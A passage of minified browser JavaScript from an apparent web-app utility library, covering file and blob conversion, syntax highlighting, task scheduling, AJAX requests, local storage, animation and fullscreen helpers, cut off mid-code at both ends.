o=arguments,i=this;n||(n=setTimeout((function(){return n=0,e.apply(i,o)}),t))}},_io.fn.debounce=function(e,t){var n,o,i;return t=0<t?t:100,function(){o=this,i=_slice.call(arguments,0),clearTimeout(n),n=setTimeout((function(){e.apply(o,i)}),t)}},_io.fn.leading=function(e,t){var n,o,i;return t=0<t?t:100,function(){o=this,i=_slice.call(arguments,0),n||e.apply(o,i),clearTimeout(n),n=setTimeout((function(){e.apply(o,i)}),t)}};var queue=[],timerID;function x(e){timerID=setTimeout((function(){var e=queue.pop();e[0](),queue.length&&x(e[1])}),e)}function arg2arr(e){return _slice.call(e)}function readWithFileReader(e,t,n){var o=new FileReader;o.onloadend=function(){n(o.result)},o[e](t)}function readAsArrayBuffer(e,t){readWithFileReader("readAsArrayBuffer",e,t)}function readAsText(e,t){readWithFileReader("readAsText",e,t)}function readAsBinaryString(e,t){readWithFileReader("readAsBinaryString",e,t)}function readAsDataURL(e,t){readWithFileReader("readAsDataURL",e,t)}function convertToBlob(e,t,n){t(new Blob([e],{type:n||"text/plain; charset=UTF-8"}))}function returnURL(e,t){t(window.URL.createObjectURL(e))}function returnSelf(e,t){t(e)}function tryStringify(e,t){try{t(JSON.stringify(e))}catch(n){try{t(stringify(e))}catch(e){_io.onerror(e)}}}function tryParse(e,t){try{t(JSON.parse(e))}catch(n){try{t(parse(e))}catch(e){_io.onerror(e)}}}function stringifyReplacer(e,t){return t instanceof Function||"function"==typeof t?t.toString():t instanceof RegExp?"²RegExp²"+t:t instanceof Date?"²Date__²"+t.getTime():t}function stringify(e,t){return t=t||0,e=stringifyReplacer(null,e),JSON.stringify(e,stringifyReplacer,t)}function parseReplacer(key,value){if("string"!=typeof value||value.length<8)return value;var prefix=value.substring(0,8);return"function"===prefix?eval("("+value+")"):"²Date__²"===prefix?new Date(1*value.slice(8)):"²RegExp²"===prefix?eval(value.slice(8)):value}function parse(e){return e=parseReplacer(null,e),JSON.parse(e,parseReplacer)}function clone(e){return parse(stringify(e))}_io.fn.queue=function(e,t){t=t||10,queue.push([e,t]),clearTimeout(timerID),x(t)},_io.fn.proxy=function(e,t){var n=e;return function(){!1!==t.apply(this,arguments)&&n.apply(this,arguments)}},_io.arg={},_io.arg.arr=arg2arr,_io.reg={},_io.reg.escape=function(e){return e.replace(/[-[\]{}()*+?.\\\/^$|]/g,"\\$&")},_io.xml={},_io.xml.parse=function(e){var t;return window.DOMParser?t=(new DOMParser).parseFromString(e,"text/xml"):((t=new ActiveXObject("Microsoft.XMLDOM")).async="false",t.loadXML(e)),t},_io.equal=function(e,t){return e===t||(isArrayLike(e)?arrEqual(e,t):isObject(e)?objEqual(e,t):!!nativeEqual(e,t))},_io.each=function(e,t,n){if(e)if(isObject(e)){for(var o in e)if(_hasOwnProperty.call(e,o)&&!1===t.call(n,e[o],o,e))break}else{o=0;for(var i=e.length;o<i&&!1!==t.call(n,e[o],o,e);o++);}},_io.map=function(e,t,n,o,i,r){var a=[];return _io.each(e,(function(e,s,l){if(!(r&&-1<r.indexOf(s)))if(n&&(isArray(e)||isObject(e)))a=a.concat(_io.map(e,t,n,(o?o+(i||"."):"")+s,i,r));else{var c=t(e,s,l,o);c&&a.push(c)}})),a},_io.find=function(e,t,n,o,i){var r,a=o||".",s=_io.obj.getPath(n,t,a);return t.slice(-1)!==a&&(t+=a),t.slice(0,1)!==a&&(t=a+t),e.replace(/^\/(.*)\/(.{0,4})$/,(function(t,n,o){n&&(e=o?new RegExp(n,o):new RegExp(n))})),r=_io.isRegExp(e)?e:new RegExp(_io.reg.escape(e),"i"),_io.map(s,(function(e,n,o,i){var s=(i?i+a:"")+n;return!!r.test(s)&&t+s}),!0,null,a,i)},_io.ArrayBuffer={String:function(e,t){var n=new DataView(e),o=(new TextDecoder).decode(n);return t(o),o},Blob:convertToBlob},_io.Blob={String:readAsText,ArrayBuffer:readAsArrayBuffer,BinaryString:readAsBinaryString,DataURL:readAsDataURL,URL:returnURL},_io.File={String:readAsText,ArrayBuffer:readAsArrayBuffer,BinaryString:readAsBinaryString,DataURL:readAsDataURL,Blob:convertToBlob,URL:returnURL},_io.ArrayBuffer.ArrayBuffer=_io.Blob.Blob=_io.File.File=_io.String.String=_io.Object.Object=_io.Array.Array=returnSelf,_io.ArrayBuffer.Blob=_io.File.Blob=_io.String.Blob=convertToBlob,_io.Object.Blob=_io.Array.Blob=function(e,t,n){tryStringify(e,(function(e){convertToBlob(e,t,n)}))},_io.String.ArrayBuffer=function(e,t,n){convertToBlob(e,(function(e){readAsArrayBuffer(e,t)}),n)},_io.String.BinaryString=_io.ArrayBuffer.BinaryString=function(e,t,n){convertToBlob(e,(function(e){readAsBinaryString(e,t)}),n)},_io.String.DataURL=_io.ArrayBuffer.DataURL=function(e,t,n){convertToBlob(e,(function(e){readAsDataURL(e,t)}),n)},_io.String.URL=_io.ArrayBuffer.URL=function(e,t,n){convertToBlob(e,(function(e){returnURL(e,t)}),n)},_io.Object.ArrayBuffer=_io.Array.ArrayBuffer=function(e,t,n){tryStringify(e,(function(e){_io.String.ArrayBuffer(e,t,n)}))},_io.Object.BinaryString=_io.Array.BinaryString=function(e,t,n){tryStringify(e,(function(e){_io.String.BinaryString(e,t,n)}))},_io.Object.DataURL=_io.Array.DataURL=function(e,t,n){tryStringify(e,(function(e){_io.String.DataURL(e,t,n)}))},_io.Object.URL=_io.Array.URL=function(e,t,n){tryStringify(e,(function(e){_io.String.URL(e,t,n)}))},_io.String.Object=_io.String.Array=tryParse,_io.Object.String=_io.Array.String=tryStringify,_io.stringify=stringify,_io.parse=parse,_io.clone=clone,global.$io=_io}(this),function(e){"use strict";e.$io.str||(e.$io={str:{}}),e.$io.str.autolink=function(e){var t=[],n=0;return e.replace(/(?:\(((?:https?:\/\/|www\.)[-A-Za-z0-9+$&@#\/%?=~_()|!:,.;]+[-A-Za-z0-9+$&@#\/%=~_()|])\))/gm,(function(e,n){return t.push(n),"²_links_in_parens___ktlu_²"})).replace(/((?:https?:\/\/|www\.)[-A-Za-z0-9+$&@#\/%?=~_()|!:,.;]*[-A-Za-z0-9+$&@#\/%=~_()|])/gm,(function(e){return'<a target="_blank" href="'+(0==e.indexOf("http")?e:"http://"+e)+'">'+e+"</a>"})).replace(/([\w.]*\w@[\w.]+\w)/gm,'<a href="mailto:$1">$1</a>').replace(RegExp("²_links_in_parens___ktlu_²","g"),(function(){var e=t[n++];return'(<a target="_blank" href="'+e+'">'+e+"</a>)"}))}}(this),function(e){"use strict";function t(e){return e=e.replace(/</g,"²_less__²").replace(/>/g,"²_more__²").replace(/&/g,"²_amp__²").replace(/"/g,"²_quot__²").replace(/'/g,"²_squot__²"),(e=$io.str.autolink(e)).replace(RegExp("²_amp__²","g"),"&amp;").replace(RegExp("²_quot__²","g"),"&quot;").replace(RegExp("²_squot__²","g"),"&#39;").replace(RegExp("²_less__²","g"),"&lt;").replace(RegExp("²_more__²","g"),"&gt;")}e.$io.str||(e.$io={str:{}}),e.$io.str.hilit=function(e,n){if("string"!=typeof e)return"";var o=[],i=0,r=[],a=0,s=[],l=0,c=[],u=0;return(n?"":'<code class="language-javascript ui_hilit">')+e.replace(/\/\*[\W\w]*?\*\//g,(function(e){return r.push(e),"_comment__ktlu_"})).replace(/([\r\n\s,.;[({=&|!])(\/(?!\/)(?:\[.+?]|\\.|[^\/\r\n])+\/[gimyu]{0,5})(?=\s*($|[\r\n,.;})\]]))/g,(function(e,t,n){return c.push(n),t+"_regex____ktlu_"})).replace(/('(\\')?(([^\\]\\'|[^'\n]|\\\n)*)')|("(\\")?(([^\\]\\"|[^"\n]|\\\n)*)")/g,(function(e){return o.push(e),"_string___ktlu_"})).replace(/\/\/.*/g,(function(e){return s.push(e),"_komment__ktlu_"})).replace(/([+\/\|\^&%!~<>=-]|&amp;|&lt;?|&gt;?)/g,'<span class="sh_operator">$1</span>').replace(/(\$[a-z0-9_$]+)/gi,'<span class="sh_42">$1</span>').replace(/((?!\d)[a-z0-9_$]+)(\s*:\s*function)/gi,'<span class="sh_function">$1</span>$2').replace(/\.((?!\d)[a-z0-9_$]+(?=\())/gi,'.<span class="sh_propfunction">$1</span>').replace(/((?!\d)[a-z0-9_$]+(?=\())/gi,'<span class="sh_function">$1</span>').replace(/([[\]{}().,;:])/g,'<span class="sh_punctuation">$1</span>').replace(/\b-?(0x[\dA-Fa-f]+|\d*\.?\d+([Ee]-?\d+)?|true|false|NaN|-?Infinity)\b/g,'<span class="sh_number">$1</span>').replace(/\b(break|case|catch|const|continue|debugger|default|delete|do|else|enum|export|extends|finally|for|function|get|if|implements|import|in|instanceof|interface|let|new|null|package|private|protected|public|return|set|static|super|switch|this|throw|try|typeof|var|void|while|with|yield)\b/g,'<span class="sh_keyword">$1</span>').replace(RegExp("_komment__ktlu_","g"),(function(){return'<span class="sh_comment">'+t(s[l++]||"")+"</span>"})).replace(RegExp("_comment__ktlu_","g"),(function(){return'<span class="sh_comment">'+t(r[a++]||"")+"</span>"})).replace(RegExp("_string___ktlu_","g"),(function(){return'<span class="sh_string">'+t(o[i++]||"")+"</span>"})).replace(RegExp("_regex____ktlu_","g"),(function(){return'<span class="sh_keyword2">'+t(c[u++]||"")+"</span>"}))+(n?"":"</code>")},e.$io.str.freeText=t}(this),function(e){"use strict";var t={},n={},o=Array.prototype.slice,i={onerror:$noop,onready:$noop};function r(e,t){if(2<arguments.length){var n=o.call(arguments);t=n.pop(),r.series(n,t)}else $io.is.obj(e)&&"function"==typeof t?t(r.data=e):$io.is.arr(e)&&"function"==typeof t?r.parallel(e,t):"string"==typeof e&&"function"==typeof t?r.task(e,t):"function"==typeof e?r.task("modules",e):"string"!=typeof e||t||r.launch(e)}r.ready=t,r.tasks=n,r.paused=!1,r.stop=function(e){for(var t in r.paused=!0,r.off("*"),r.tasks)delete r.tasks[t];for(var t in r.ready)delete r.ready[t];for(var t in r.observers)delete r.observers[t]},r.config=function(e){$extend(i,e)},r.task=function(e,t){return(n[e]=n[e]||[]).push(t),this},r.series=function(e,t){var n={};return function o(a){if(a<e.length){var s=e[a];"string"==typeof s?(r.launch(s),r.on(s+":ready",(function(e){e.length&&(n[s]=e),o(++a)}))):r.parallel(s,(function(e,t){t.length&&$extend(n,t),o(++a)}))}else try{t(r.data,n)}catch(e){e.message="kernel.series.fn : "+e.message,i.onerror(e)}}(0),this},r.parallel=function(e,n){var o={};function a(a){for(var s=0,l=e.length;s<l;s++)if(!0!==t[e[s]])return;try{n(r.data,o)}catch(a){a.message="kernel.parallel.fn : "+a.message,i.onerror(a)}}return $io.arr.all(e,(function(e){"string"==typeof e?(r.launch(e),r.on(e+":ready",(function(n){n.length&&(o[e]=n),t[e]=!0,a()}))):r.series(e,(function(n,i){i.length&&$extend(o,i),t[e]=!0,a()}))})),this},r.launch=function(e){if(!r.paused){var o,a,s,l=0,c=n[e];if(c)for(a=0,s=c.length;a<s;a++){if(r.paused)return;++l,function(t,n){setTimeout((function(){try{1<t.length?t(r.data,n):n(t(r.data))}catch(t){t.message=e+" : "+t.message,i.onerror(t),n(t)}}),0)}(c[a],u)}return this}function u(n){n&&(o=o||[]).push(n),0==--l&&(t[e]=!0,i.onready(e),r.trigger(e+":ready",r.data,o),r.off(e+":ready"))}},e.$kernel=$watch(r)}(this),function(e){"use strict";function t(e){window.onhashchange=$noop,"replaceState"in history?e?history.replaceState("",document.title,"#!"+encodeURI(e)+window.location.search):window.location.hash&&history.replaceState("",document.title,window.location.pathname+window.location.search):window.location.hash=e?"!"+encodeURI(e):"",setTimeout((function(){window.onhashchange=n}),1e3)}function n(){var e=location.hash;e&&t.trigger("change",decodeURI(e.replace(/^#!/,"")))}(t=$watch(t)).init=function(){n()},e.$route=t}(window);var $url={parseQuery:function(e){return $io.arr.reduce(e.replace(/^\?/,"").split("&"),(function(e,t){var n=t.indexOf("="),o=t.slice(0,n),i=t.slice(++n);return e[o]=decodeURIComponent(i),e}),{})},getExtention:function(e){var t=(e||"").match(/(?:\.)([0-9a-z]+)(?:[#?].+)?$/);return t&&t[1]?t[1]:""},getDomain:function(e){var t=(e||"").match(/:\/\/(.[^/]+)/);return null!=t&&2<=t.length?t[1]:""},checkImage:function(e,t){e||t(!1);var n=new Image;function o(){0<n.width?t(!0,e,n):t(!1,e,n)}n.onload=o,n.onerror=o,n.onabort=o,n.src=e},_checkFavicon:function(e,t){if(e&&""!=$io.str.trim(e)){var n,o=$url.getDomain(e);o?$url.checkImage(n="http://"+o+"/apple-touch-icon.png",(function(e){e?t(!0,n):$url.checkImage(n="http://"+o+"/favicon.png",(function(e){e?t(!0,n):$url.checkImage(n="http://"+o+"/favicon.ico",(function(e){e?t(!0,n):$url.checkImage(n="http://"+o+"/favicon.gif",(function(e){e?t(!0,n):t(!1)}))}))}))})):t(!1)}else t(!1)},checkFavicon:function(e,t){var n=["/favicon-32x32.png","/favicon.png","/favicon.gif","/favicon.ico"];if(e&&""!=$io.str.trim(e)){var o=$url.getDomain(e),i=!1,r=n.length-1;if(o)for(var a=0,s=n.length;a<s&&!i;a++)$url.checkImage("http://"+o+n[a],(function(e,n){e&&!i?t(i=!0,n):i||0==--r&&t(!1)}));else t(!1)}else t(!1)}};function $maxZ(e,t){var n,o,i,r,a=0;if("string"==typeof e)n=(t||document).querySelectorAll(e);else if($io.isNodeList(e))n=e;else{if(!$io.isElement(e))throw new Error("$maxZ: invalid selector");n=[e]}return $io.arr.all(n,(function(e){o=window.getComputedStyle(e,null),i=o.zIndex;var t=Number(i);"static"!=o.position&&"auto"!=i&&a<t&&(r=e,a=t)})),{num:a,el:r}}function $chain(){"use strict";function e(e,t,n){Object.defineProperty(e,n,{get:function(){var e=t();return void 0===e?this:e}})}function t(e,t,n){e[n]=function(){var e=t.apply(this,arguments);return void 0===e?this:e}}function n(o,i,r){return $io.isObject(i)&&$io.obj.all(i,(function(n,i){!0===r?e(o,n,i):t(o,n,i),"both"===r&&(e(o,n,i),t(o,n,i))})),$io.isObject(r)?n(o,r,!0):o}var o=n.apply(null,arguments);return o.prop=function(e){return n(this,e,!0)},o.meth=function(e){return n(this,e)},o}function $undo(e){var t=e||[],n=e?e.length:0,o=window.$noop||function(e){};return{get:function(){return t.slice(0,0<=n?n:0)},cursor:function(){return n},history:function(){return t},clear:function(){t.length=n=0},add:function(e){return t.splice(n++,t.length,e),e},each:function(e){n>t.length&&(n=t.length);for(var o=0;o<n;o++)e(t[o])},redo:function(e){if(n++>t.length&&(n=t.length+1),n<=0&&(n=1),t[n-1]){var i=t[n-1].redo?t[n-1].redo():t[n-1];(e||o)(i)}return i},undo:function(e){if(--n<-1&&(n=-1),n>=t.length&&(n=t.length-1),t[n]){var i=t[n].undo?t[n].undo():t[n];(e||o)(i)}return i}}}function $loop(e,t){"use strict";var n,o;function i(t){e((t-n)/1e3),o=requestAnimationFrame(i),n=performance.now()}function r(){e((performance.now()-n)/1e3),o=setTimeout(r,t),n=performance.now()}function a(){e(),o=requestAnimationFrame(a)}function s(){e(),o=setTimeout(s,t)}function l(n){return c(),void 0!==n&&(t=n),(e.length?t&&0<t?r:i:t&&0<t?s:a)(0),d}function c(){return t?clearTimeout(o):cancelAnimationFrame(o),d}var u=!1,d={callback:e,play:l,pause:c,toggle:function(){return u=u?(c(),!1):(l(),!0),d},fn:function(t){e=t},destroy:function(){c(),d=null}};return d}$url.query=$url.parseQuery(window.location.search.substring(1)),function(e){"use strict";function t(){return!!(document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement||document.msFullscreenElement)}var n;e.$fullscreen=function(e,o){n&&(document.removeEventListener("fullscreenchange",n,!1),document.removeEventListener("webkitfullscreenchange",n,!1),document.removeEventListener("mozfullscreenchange",n,!1)),t()?(document.exitFullscreen?document.exitFullscreen():document.msExitFullscreen?document.msExitFullscreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.webkitExitFullscreen&&document.webkitExitFullscreen(),"function"==typeof o&&o()):(document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.msRequestFullscreen?document.documentElement.msRequestFullscreen():document.documentElement.mozRequestFullScreen?document.documentElement.mozRequestFullScreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT),"function"==typeof e&&e()),n=function(){t()?"function"==typeof e&&e():"function"==typeof o&&o()},document.addEventListener("fullscreenchange",n,!1),document.addEventListener("webkitfullscreenchange",n,!1),document.addEventListener("mozfullscreenchange",n,!1)}}(this),function(e){"use strict";var t,n,o,i=(t=document.createElement("div"),n="Khtml Ms ms MS O o Moz moz webkit Webkit webKit WebKit".split(" "),o=n.length,function(e){if(e in t.style)return e;e=e.replace(/^[a-z]/,(function(e){return e.toUpperCase()}));for(var i=0;i<o;i++)if(n[i]+e in t.style)return n[i]+e;return!1})("animationName");function r(e,t,n){function o(){n(!0),e.removeEventListener("animationend",o,!1),e.removeEventListener("webkitAnimationEnd",o,!1),e.removeEventListener("MSAnimationEnd",o,!1),e.removeEventListener("oAnimationEnd",o,!1),e.removeEventListener("oanimationend",o,!1),e.classList.remove(t)}!function(e,t){var n=document.createElement("div");n.className=e,document.body.appendChild(n),"none"!=window.getComputedStyle(n,null)[i]?t(!0):t(!1),n.parentNode.removeChild(n)}(t,(function(i){i?function(e,t,n){e.addEventListener("animationend",n,!1),e.addEventListener("webkitAnimationEnd",n,!1),e.addEventListener("MSAnimationEnd",n,!1),e.addEventListener("oAnimationEnd",n,!1),e.addEventListener("oanimationend",n,!1),e.classList.add(t)}(e,t,o):n(!1)}))}r.i=["rubberBand","swing","tada","wobble","bounceIn","bounceInDown","bounceInLeft","fadeIn","fadeInDown","fadeInDownBig","fadeInLeft","fadeInLeftBig","fadeInRight","flip","flipInX","flipInY","lightSpeedIn","rotateIn","rotateInDownLeft","rotateInDownRight","rotateInUpRight","slideInDown","slideInLeft","rollIn","zoomIn","zoomInDown","zoomInLeft","zoomInRight","zoomInUp"],r.o=["bounceOut","bounceOutDown","bounceOutLeft","bounceOutRight","bounceOutUp","fadeOut","fadeOutDown","fadeOutDownBig","fadeOutLeft","fadeOutLeftBig","fadeOutRight","fadeOutRightBig","fadeOutUp","lightSpeedOut","rotateOut","rotateOutDownLeft","rotateOutDownRight","rotateOutUpLeft","rotateOutUpRight","slideOutLeft","slideOutRight","slideOutUp","hinge","rollOut","zoomOut","zoomOutDown","zoomOutLeft","zoomOutRight","zoomOutUp"],e.$animate=r}(this),function(e){"use strict";var t=document.body.classList;e.$state={wait:function(){t.add("ui_wait")},isLoading:function(){return t.contains("ui_loading--block")||t.contains("ui_loading")},loading:function(e){t.add(!0===e?"ui_loading--block":"ui_loading")},loaded:function(){t.remove("ui_loading--block"),t.remove("ui_loading")},pause:function(){t.add("ui_pause")},play:function(){t.remove("ui_pause")}}}(this),function(e){"use strict";var t={get:function(){var e="";return window.getSelection?e=window.getSelection().toString():document.selection&&"Control"!=document.selection.type&&(e=document.selection.createRange().text),e},create:function(e,t,n){if(e.createTextRange){var o=e.createTextRange();o.collapse(!0),o.moveStart("character",t),o.moveEnd("character",n),o.select(),e.focus()}else e.setSelectionRange?(e.focus(),e.setSelectionRange(t,n)):void 0!==e.selectionStart&&(e.selectionStart=t,e.selectionEnd=n,e.focus())},copy:function(e){if("string"==typeof e){var t=document.createElement("textarea");t.value=e,document.body.appendChild(t),console.log(t),e=t}if(e)if(window.getSelection().removeAllRanges(),e.select)e.focus(),e.select();else{var n=document.createRange();n.selectNode(e),window.getSelection().addRange(n)}try{var o=document.execCommand("copy")?"successful":"unsuccessful";console.log("Copy command was "+o)}catch(e){console.log("Oops, unable to copy")}e&&window.getSelection().removeAllRanges()}};e.$selection=t}(this),function(e){"use strict";function t(e){var t,n;try{t=JSON.parse(e.responseText),n=!0}catch(o){t="text"===e.responseType||""===e.responseType?e.responseText:null,n=!1}return[t,e.status,e,n]}function n(e,n,o){var i=new Error("nope"),r=function(){if(window.XMLHttpRequest&&("file:"!=window.location.protocol||!window.ActiveXObject))return new XMLHttpRequest;try{return new ActiveXObject("Microsoft.XMLHTTP")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP.6.0")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP.3.0")}catch(e){}try{return new ActiveXObject("Msxml2.XMLHTTP")}catch(e){}return!1}(),a={done:function(){},fail:function(){},guest:function(){}},s={done:function(e){return a.done=e,s},fail:function(e){return a.fail=e,s},guest:function(e){return a.guest=e,s}},l={arraybuffer:!1};return"GET"==e&&o&&(l=o,o=null),n&&"/"!==n?(r.open(e,n,!0),l.arraybuffer&&(r.responseType="arraybuffer"),r.setRequestHeader("Content-type","application/x-www-form-urlencoded"),r.setRequestHeader("X-Requested-With","XMLHttpRequest"),o&&o._csrf&&(r.setRequestHeader("X-CSRF-Token",o._csrf),delete o._csrf),r.onreadystatechange=function(){if(4===r.readyState)if(200<=r.status&&r.status<300)l.arraybuffer?a.done.apply(a,[r.response,r.status,r,!1]):a.done.apply(a,t(r));else if(401==r.status)a.guest.call(a,r.statusText,{type:e.toLowerCase(),url:n,data:o});else{var s=t(r);i.message=e+" "+n+" "+s[2].status+" ("+s[2].statusText+")",a.fail.apply(a,[i].concat(s))}},o?r.send(function(e){if(!function(e){return e===Object(e)}(e))return e;var t=[];for(var n in e)null!=e[n]&&t.push(encodeURIComponent(n)+"="+encodeURIComponent(e[n]));return t.join("&")}(o)):r.send()):a.fail.call(a,"Invalid url"),s}function o(e,t,o,i){var r=n("GET",e);r.done(t||$noop),r.fail(o||$noop),r.guest(i||$noop)}o.get=function(e,t){return n("GET",e,t)},o.post=function(e,t){return n("POST",e,t)},o.delete=function(e,t){return n("DELETE",e,t)},o.put=function(e,t){return n("PUT",e,t)},o.buffer=function(e,t){var n=new XMLHttpRequest;n.open("GET",e,!0),n.responseType="arraybuffer",n.onload=function(e){var o=n.response;o&&t(o)},n.send(null)},e.$ajax=o}(this),function(e){"use strict";var t=e.localforage;if(!t)throw new Error("Your browser doesn't support local save");function n(e,t,o){n.get(t,(function(t,n){o(t,n||e)}))}t.config({name:"fs",storeName:"a"}),t.setDriver(t.INDEXEDDB),n.set=function(e,n,o){var i=n;t.setItem(e,i,(function(e,t){e&&$alert.error(e),(o||$noop)(e,t)}))},n.get=function(e,n){t.getItem(e,(function(e,t){(n||$noop)(e,t)}))},n.update=function(e,t,o){n.get(e,(function(i,r){i||"function"!=typeof t||n.set(e,t(r),o||$noop)}))},n.getRaw=function(e,n){t.getItem(e,n||$noop)},n.del=function(e,n){t.removeItem(e,n||$noop)},n.clear=function(e){t.clear(e||$noop)},n.keys=function(e){t.keys(e||$noop)},n.store=t,e.$db=n}(this),function(e){var t=window.localStorage,n={},o={};if(!t)throw new Error("Your browser doesn't support local save");function i(e,t,r,a){var s=i.get(e);return s||(s=i.set(e,t)),"function"==typeof a&&(o[e]=a),"function"==typeof r&&(n[e]=r)(s),s}i.set=function(e,n,o){var r=n;if("string"!=typeof n)try{r=JSON.stringify(n)}catch(e){}try{t.setItem(e,r),o||i.autoReady(e,n)}catch(e){$alert.error(e)}return n},i.get=function(e){var n=t.getItem(e);try{n=JSON.parse(n)}catch(e){}return n},i.update=function(e,t){var n=i.get(e);if("function"==typeof t)return i.set(e,t(n))},i.getRaw=function(e){return t.getItem(e)},i.del=function(e){t.removeItem(e),n[e]=null,o[e]=null},i.onReady=function(e,t){return"function"==typeof t&&(n[e]=t),n[e]},i.onSave=function(e,t){return"function"==typeof t&&(o[e]=t),o[e]},i.autoReady=function(e,t){n.hasOwnProperty(e)&&"function"==typeof n[e]&&n[e](t)},i.autoSave=function(e){o.hasOwnProperty(e)&&"function"==typeof o[e]&&i.set(e,o[e](),!0)},i.clear=function(){for(var e in t.clear(),n)n.hasOwnProperty(e)&&(n[e]=null);for(var e in o)o.hasOwnProperty(e)&&(o[e]=null)},i.keys=function(){return Object.keys(t)},window.self!==window.top&&window.parent.$store?e.$store=window.parent.$store:(window.addEventListener("beforeunload",(function(e){for(var t in o)i.autoSave(t)})),e.$store=i)}(this),function(e){"use strict";var t=!1,n=[];function o(e,o){"string"==typeof(e=e||{})&&(o||document).querySelector(e),1!==e.nodeType&&(e=document);var i,r=!0;return $io.arr.all(n,(function(t){t.elem===e&&(r=!1)})),r&&n.push({elem:e,attach:[]}),i={get:function(){return e},html:function(t){return t?(e.innerHTML=t,i):e.innerHTML},add:function(t){return e.innerHTML=e.innerHTML+t,i},empty:function(){for(;e.firstChild;)e.removeChild(e.firstChild);return i},each:function(t,n){for(var o=e.querySelectorAll(t),r=0,a=o.length;r<a;r++)n.call(o[r],o[r],r);return i},append:function(t){var n,o;if("string"==typeof t){(n=document.createElement("div")).innerHTML=t;for(var r=0,a=(o=n.childNodes).length;r<a;r++)o[r]&&1===o[r].nodeType&&e.appendChild(o[r])}else e.appendChild(t);return i},click:function(){if("createEvent"in document){var t=document.createEvent("MouseEvents");t.initMouseEvent("click",!0,!1,window,0,0,0,0,0,!1,!1,!1,!1,0,null),e.dispatchEvent(t)}else e.fireEvent("onclick")},trigger:function(t){if("click"!==t)if("createEvent"in document){var n=document.createEvent("HTMLEvents");n.initEvent(t,!1,!0),e.dispatchEvent(n)}else e.fireEvent("on"+t);else i.click()},on:function(o,r,a,s){function l(e){if(!this.disabled)return!1===a.call(this,e)?(e.preventDefault(),e.stopPropagation(),e.stopImmediatePropagation(),!1):void 0}"function"==typeof r&&(s=a,a=r,r=null),s=!!s;var c=r?$delegate(r,l):l;return o.replace(/[^\s]+/g,(function(o){var i;"doubletap"===o?(i=c,c=function(e){!function(e,n){t?(clearTimeout(t),t=null,n(e),e.preventDefault()):t=setTimeout((function(){t=null}),300)}(e,i.bind(this)),e.stopPropagation()},e.addEventListener("touchstart",c,s)):e.addEventListener(o,c,s),$io.arr.all(n,(function(t){t.elem===e&&t.attach.push({name:o,childs:r,handler:a,scopeHandler:c,useCapture:s})}))})),i},off:function(t,o,r){return r||(r=o,o=null),t.replace(/[^\s]+/g,(function(t){$io.arr.all(n,(function(n){n.elem===e&&$io.arr.all(n.attach,(function(n){n.name==t&&n.childs==o&&n.handler==r&&e.removeEventListener(t,n.scopeHandler,n.useCapture)}))}))})),i}}}o.create=function(e,t,n){var o,i,r=e.split(/[>| ]+/);return n&&r.pop(),!r&&t?t:($io.arr.all(r,(function(e){e.replace(/(\w+)?(#(\w+))?(\.([\w|.]+))?/,(function(e,t,n,r,a,s){var l=document.createElement(t||"div");r&&(l.id=r),s&&(l.className=s.split(".").join(" ")),i&&i.appendChild(l),i=l,o||(o=i)}))})),t&&i.appendChild(t),o)},o.each=function(e,t){for(var n=document.querySelectorAll(e),i=0,r=n.length;i<r;i++)t.call(n[i],n[i],i);return o},e.$el=o}(this),function(e){"use strict";e.$on={resize:function e(t,n){if(!e.watchedElementData){e.watchedElementData=[];var o=function(){e.watchedElementData.forEach((function(e){t.offsetWidth===e.offsetWidth&&t.offsetHeight===e.offsetHeight||(e.offsetWidth=t.offsetWidth,e.offsetHeight=t.offsetHeight,e.callback())}))};window.addEventListener("resize",o),new MutationObserver(o).observe(document.body,{attributes:!0,childList:!0,characterData:!0,subtree:!0})}e.watchedElementData.push({element:t,offsetWidth:t.offsetWidth,offsetHeight:t.offsetHeight,callback:n})}}}(this),function(e){"use strict";var t=Object.prototype.hasOwnProperty,n=Array.prototype.slice,o=Object.prototype.toString,i=Array.isArray?Array.isArray:function(e){return e&&"object"==typeof e&&"number"==typeof e.length&&"[object Array]"==o.call(e)||!1};function r(e){var a,s,l,c,u=!1;for("concat"===(e="boolean"==typeof e||"string"==typeof e?(a=n.call(arguments,1),!0===e?"deep":e):(a=arguments,!1))&&(e="deep",u=!0),s=a[0],l=1,c=a.length;l<c;l++){var d=a[l];for(var f in d){var p=d[f];("strict"!=e||t.call(s,f))&&("deep"!=e||"[object Object]"!==o.call(p)?u&&i(p)?i(s[f])?s[f]=s[f].concat(p):s[f]=[].concat(p):s[f]=p:("[object Object]"!==o.call(s[f])&&(s[f]={}),r(e,s[f],p)))}}return s}r.deep=function(){return r.apply(this,["deep"].concat(n.call(arguments)))},r.strict=function(){return r.apply(this,["strict"].concat(n.call(arguments)))},r.clone=function(){return r.apply(this,["deep",{}].concat(n.call(arguments)))},e.$extend=r}(this),function(e){"use strict";var t={default:document.body};function n(e,o,i){"function"==typeof o&&(i=o,o={});var r,a,s=$extend({},t,o);return $loader(["/c/libs/rasterizeHTML.allinone.js"],(function(){var t,o="<style>",l=!1;if(e){if("string"==typeof e)t=document.querySelector(e),r=$el.create(e,t.cloneNode(!0));else if($io.isElement(e))(r=(t=e).cloneNode(!0)).id="screenshot__unique__selector",e="#"+r.id;else{if(!$io.isDocument(e))return void console.error("$screenshot : invalid selector!");l=!0,r=(t=e).cloneNode(!0)}var c=s.width||t.offsetWidth,u=s.height||t.offsetHeight;l||(o+="body {background:transparent !important}\n"+e+" {width:"+c+"px!important;height:"+u+"px!important;position:absolute!important; top:0px!important;left:0px!important}\n")}else t=s.default,r=t.cloneNode(!0),c=t.offsetWidth,u=t.offsetHeight;if(r){$io.arr.all(r.querySelectorAll(".js_image_inline"),(function(e){o+='.js_image_inline[data-image-id="'+e.dataset.imageId+'"] {  background-image: '+e.style.backgroundImage+"!important;  background-size: "+e.style.backgroundSize+"!important;  background-position: "+e.style.backgroundPosition+"!important;  background-repeat: "+e.style.backgroundRepeat+"!important;}"})),o+="</style>",$io.arr.all(document.styleSheets,(function(e){o+=e.ownerNode.outerHTML}));var d=document.createElement("canvas");d.width=c+1,d.height=u+1,a=function(e,n){rasterizeHTML[l?"drawDocument":"drawHTML"](l?r:o+e,d,{useBlobs:!1,baseUrl:l?null:window.location.origin}).then((function(e){n(d,t||r,e)}),(function(e){$alert.error(e)}))};var 